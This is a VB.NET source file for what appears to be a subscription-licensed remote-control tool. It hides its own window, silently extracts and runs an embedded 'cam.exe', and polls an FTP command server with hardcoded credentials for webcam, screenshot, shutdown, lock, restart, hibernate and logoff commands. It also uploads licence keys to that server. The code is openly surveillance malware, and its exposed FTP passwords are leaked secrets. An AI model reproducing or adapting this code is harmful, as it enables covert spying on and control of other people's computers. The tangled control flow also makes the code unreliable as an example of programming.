Imports System.IO
Imports Microsoft.Win32
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        clickcam()
        MsgBox("Worked")
        End
        If My.Settings.expiredate = Nothing Then
            My.Settings.expiredate = DateTime.Now
        Else
            Me.Visible = False
            ShowInTaskbar = False
            pccpu()
            expirdown()
        End If
        Me.Visible = False
        ShowInTaskbar = False
        pccpu()
        expirdown()

    End Sub


    Public Sub pccpu()

        Dim computer As String = "."
        Dim wmi As Object = GetObject("winmgmts:" &
        "{impersonationLevel=impersonate}!\\" &
        computer & "\root\cimv2")
        Dim processors As Object = wmi.ExecQuery("Select * from " &
        "Win32_Processor")

        Dim cpu_ids As String = ""
        For Each cpu As Object In processors
            cpu_ids = cpu_ids & ", " & cpu.ProcessorId
        Next cpu
        If cpu_ids.Length > 0 Then cpu_ids =
        cpu_ids.Substring(2)
        If Not My.Settings.newpc = cpu_ids Then
            MsgBox("This Product Does Not Belong To You!")
            End
        End If
    End Sub


    Public Sub expirdown()
        'check for expired order
        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/ley.lance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/ley.lance", "ley.lance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            expiracheck()

        Catch ex As Exception
            expiracheck()
        End Try
        expiracheck()
    End Sub


    Public Sub expiracheck()
        ' online expire check
        If File.Exists("ley.lance") Then
            Dim expirdat As String
            expirdat = FileLen("ley.lance")
            If expirdat > "0" Then
                MsgBox("Product Expired!")
                File.Delete("ley.lance")
                End

            ElseIf expirdat = "0" Then
                File.Delete("ley.lance")
                indexfunc()

            End If
        Else
            indexfunc()

        End If
        indexfunc()
    End Sub


    Public Sub indexfunc()
        ' Main Function
        If My.Settings.Lifetimepack = True Then
            filecheckweb()
        ElseIf My.Settings.expiredate = Nothing Then
            My.Settings.expiredate = DateTime.Now
            My.Settings.Save()
        ElseIf My.Settings.regkey = Nothing Then
            regkeys()
        ElseIf My.Settings.regkeymonth = Nothing Then
            regkeysmonth()
        Else
            Me.Hide()
            trialcheck()
        End If

        End

    End Sub


    Public Sub regkeys()
        ' For A Year
        Dim rannum As Random
        rannum = New Random

        Try
            My.Settings.regkey = String.Empty
            My.Settings.regkey = rannum.Next(100000, 1000000)
            TextBox2.Text = My.Settings.regkey
            My.Computer.Network.UploadFile("regkey", "ftp://ftp.leylance.xyz/faysal/6sv1ds65v1ds651vds651lice6fv1f65b1fnacs54se/duvbadkvjadvjnadvjknregasklcnalscnkylacnascnyeadvklndar/" + DateTime.Now + "_::1 Year Registration Key::_" + TextBox2.Text, "u945780831.userconnctons", "ulJ$o9`P4?90TfJg3~")
            My.Settings.Save()
        Catch ex As Exception
            MsgBox("Somethings wrong with your network or our server. Try again later!")
            End
        End Try
    End Sub

    Public Sub regkeysmonth()

        ' For 3 months
        Dim rannum As Random
        rannum = New Random

        Try
            My.Settings.regkeymonth = String.Empty
            My.Settings.regkeymonth = rannum.Next(100000, 1000000)
            TextBox2.Text = My.Settings.regkeymonth
            My.Computer.Network.UploadFile("regkey", "ftp://ftp.leylance.xyz/faysal/6sv1ds65v1ds651vds651lice6fv1f65b1fnacs54se/s65v1ds65v1ds65v1ds65vdsv6moas65c1as65ac4nas5cas65cthas53c1as5/" + DateTime.Now + "_::Month Registration Key::_" + TextBox2.Text, "u945780831.userconnctons", "ulJ$o9`P4?90TfJg3~")
            My.Settings.Save()
        Catch ex As Exception
            MsgBox("Somethings wrong with your network or our server. Try again later!")
            End
        End Try

    End Sub


    Public Sub trialcheck()

        If My.Settings.expiredate <= DateTime.Now Then
            TextBox1.Text = InputBox("Please Enter you Registration Key!", "Registration Key", , , )
            If TextBox1.Text = My.Settings.regkey Then
                regkeys()
                My.Settings.expiredate = String.Empty
                My.Settings.expiredate = DateTime.Now.AddYears(1)
                My.Settings.Save()
                MsgBox("License Renewed for 1 Year! Congratulations! Your Product is valid till: " + My.Settings.expiredate)
                End
            ElseIf TextBox1.Text = My.Settings.regkeymonth Then
                regkeysmonth()
                My.Settings.expiredate = String.Empty
                My.Settings.expiredate = DateTime.Now.AddMonths(3)
                My.Settings.Save()
                MsgBox("License Renewed for 3 Months! Congratulations! Your Product is valid till: " + My.Settings.expiredate)
                End
            ElseIf TextBox1.Text = "17939c7903d578b21c9fd096b5d109c8" Then
                My.Settings.Lifetimepack = True
                My.Settings.Save()
                MsgBox("You have subcribed for our Lifetime Package! Hope you like our products and Stay with is for more!")
            Else
                MsgBox("Invalid Registration Key! Please buy our subscription to continue this service")
                End
            End If

        End If



        Try
            filecheckweb()



        Catch ex As Exception
            filecheckweb()


        End Try
        filecheckweb()
        End

    End Sub



    Public Sub filecheckweb()
        ' Webcam
        If File.Exists("webc.llance") Then
            Dim webb As String
            webb = FileLen("webc.llance")
            If webb > "0" Then
                filecheckscreen()

            ElseIf webb = "0" Then
                File.Delete("webc.llance")
                filecheckscreen()

            End If
        Else
            filecheckscreen()

        End If
        filecheckscreen()
    End Sub

    Public Sub filecheckscreen()

        'Screenshot
        If File.Exists("scrncp.llance") Then
            Dim screen As String
            screen = FileLen("scrncp.llance")
            If screen > "0" Then
                filechecklck()
            ElseIf screen = "0" Then
                File.Delete("scrncp.llance")
                filechecklck()
            End If
        Else
            filechecklck()
        End If
        filechecklck()
    End Sub

    Public Sub filechecklck()
        If File.Exists("lcko.llance") Then
            Dim lckk As String
            lckk = FileLen("lcko.llance")
            If lckk > "0" Then
                filecheckunlck()
            Else
                File.Delete("lcko.llance")
                filecheckunlck()
            End If
        Else
            filecheckunlck()
        End If
        filecheckunlck()
    End Sub
    Public Sub filecheckunlck()
        If File.Exists("unlcko.llance") Then
            Dim unlckk As String
            unlckk = FileLen("unlcko.llance")
            If unlckk > "0" Then
                filecheckshutd()
            Else
                File.Delete("unlcko.llance")
                filecheckshutd()
            End If
        Else
            filecheckshutd()
        End If
        filecheckshutd()
    End Sub

    Public Sub filecheckshutd()

        If File.Exists("shutdwn.llance") Then
            Dim shutdd As String
            shutdd = FileLen("shutdwn.llance")
            If shutdd > "0" Then
                filecheckhiber()
            Else
                File.Delete("shutdwn.llance")
                filecheckhiber()
            End If
        Else
            filecheckhiber()
        End If
        filecheckhiber()
    End Sub

    Public Sub filecheckhiber()
        If File.Exists("slepe.llance") Then
            Dim sleepe As String
            sleepe = FileLen("slepe.llance")
            If sleepe > "0" Then
                filechecklogoff()
            Else
                File.Delete("slepe.llance")
                filechecklogoff()
            End If
        Else
            filechecklogoff()
        End If
        filechecklogoff()
    End Sub
    Public Sub filechecklogoff()

        If File.Exists("ologf.llance") Then
            Dim ologff As String
            ologff = FileLen("ologf.llance")
            If ologff > "0" Then
                webcam()
            Else
                File.Delete("ologf.llance")
                webcam()
            End If
        Else
            webcam()
        End If
        webcam()
    End Sub


    Public Sub webcam()

        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/df541vfd4v1fs5v1ad65cv1dav6511web6as5dasas6c1cam65fv41s65vdsv5d65s1va65s1cs65c1asc/webc.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/df541vfd4v1fs5v1ad65cv1dav6511web6as5dasas6c1cam65fv41s65vdsv5d65s1va65s1cs65c1asc/webc.llance", "webc.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            screenshot()

        Catch ex As Exception
            screenshot()
        End Try

    End Sub

    Public Sub screenshot()
        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/vdkjvdjcascsuicbasucbcapturejsncajknscreenlasdjclnasclnscljnascladjncaljcnaslcnkls/scrncp.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/vdkjvdjcascsuicbasucbcapturejsncajknscreenlasdjclnasclnscljnascladjncaljcnaslcnkls/scrncp.llance", "scrncp.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            shutdown()

        Catch ex As Exception
            shutdown()
        End Try

    End Sub

    Public Sub shutdown()

        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/lsidvndsvndsvndvndsvkjshutdolsnvsldvnwnkslancaslkncaslkcnlsncalskckldnvdvkndvvfnvl/shutdwn.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/lsidvndsvndsvndvndsvkjshutdolsnvsldvnwnkslancaslkncaslkcnlsncalskckldnvdvkndvvfnvl/shutdwn.llance", "shutdwn.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            lockdev()

        Catch ex As Exception
            lockdev()
        End Try

    End Sub

    Public Sub lockdev()

        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/euivhdavjdhvdsivudvlocdauhkssauoacacsacoasnciosjaidhiovhadsfiosaicasiiaoshcaiocasi/lcko.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/euivhdavjdhvdsivudvlocdauhkssauoacacsacoasnciosjaidhiovhadsfiosaicasiiaoshcaiocasi/lcko.llance", "lcko.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            unlockdev()

        Catch ex As Exception
            unlockdev()
        End Try

    End Sub

    Public Sub unlockdev()
        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance", "unlcko.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            restart()

        Catch ex As Exception
            restart()
        End Try
    End Sub



    Public Sub restart()

        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/suvbdskjvadjvnasjvndkjvdsnkjvrestarsajcnasjcntsljacnsjcnljvndvkndlkvldsknvldsnfjnk/restrt.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/suvbdskjvadjvnasjvndkjvdsnkjvrestarsajcnasjcntsljacnsjcnljvndvkndlkvldsknvldsnfjnk/restrt.llance", "restrt.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            hibernate()

        Catch ex As Exception
            hibernate()
        End Try

    End Sub
    Public Sub hibernate()
        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/vfjvnasslcnsavljavnhibernetsacbsacjbvkddkjvbdvjavkjasbcasjcsjbvaskjvdajvkbdvkdjsvd/slepe.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/vfjvnasslcnsavljavnhibernetsacbsacjbvkddkjvbdvjavkjasbcasjcsjbvaskjvdajvkbdvkdjsvd/slepe.llance", "slepe.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            logoff()

        Catch ex As Exception
            logoff()
        End Try

    End Sub
    Public Sub logoff()

        Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/qkvnavndvjndskvjoffasjcnlogsajcnasjcnacnadlkcnddklvndlkvnadvklnakvcasnvklancsackns/ologf.llance"), System.Net.FtpWebRequest)
        mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
        mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize

        Try

            My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/qkvnavndvjndskvjoffasjcnlogsajcnasjcnacnadlkcnddklvndlkvnadvklnakvcasnvklancsackns/ologf.llance", "ologf.llance", "u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Credentials = New System.Net.NetworkCredential("u945780831.faysal", "/$]UcqF+7zK#Gx`CZK")
            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
            mReq.GetResponse()
            End

        Catch ex As Exception
            End
        End Try
        End
    End Sub

    Private Sub clickcam()

        Dim webcm As String = "cam.exe"
        IO.File.WriteAllBytes(webcm, My.Resources.cam)

        Dim cam As New ProcessStartInfo(webcm)
        cam.WindowStyle = ProcessWindowStyle.Hidden
        Process.Start(cam)


    End Sub

End Class
